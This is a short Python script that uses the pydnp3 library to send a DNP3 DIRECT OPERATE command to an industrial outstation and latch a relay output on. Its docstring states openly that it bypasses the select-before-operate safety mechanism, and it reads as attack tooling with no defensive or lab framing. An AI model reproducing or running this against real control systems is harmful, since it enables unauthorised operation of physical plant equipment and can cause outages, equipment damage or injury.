# Using pydnp3 library for proper DNP3 implementation
from pydnp3 import opendnp3, openpal, asiopal, asiodnp3

def dnp3_direct_operate(master_ip, outstation_ip, point_index):
    """
    Send DIRECT OPERATE command to DNP3 outstation
    Bypasses SELECT-BEFORE-OPERATE safety mechanism
    """

    # Configure DNP3 master
    manager = asiodnp3.DNP3Manager(1)

    # Create channel
    channel = manager.AddTCPClient("client",
                                  opendnp3.levels.ALL_COMMS,
                                  asiopal.ChannelRetry(),
                                  outstation_ip,
                                  "0.0.0.0",
                                  20000,
                                  asiodnp3.LinkConfig(False, False))

    # Create master
    master = channel.AddMaster("master",
                              asiodnp3.PrintingSOEHandler(),
                              asiodnp3.DefaultMasterApplication(),
                              asiodnp3.MasterStackConfig())

    # Build CROB (Control Relay Output Block)
    crob = opendnp3.ControlRelayOutputBlock(
        opendnp3.ControlCode.LATCH_ON,  # Turn on
        1,  # Count
        100,  # On-time (ms)
        100  # Off-time (ms)
    )

    # Send Direct Operate
    master.DirectOperate(crob, point_index)

    print(f"[+] Sent DIRECT OPERATE to point {point_index}")
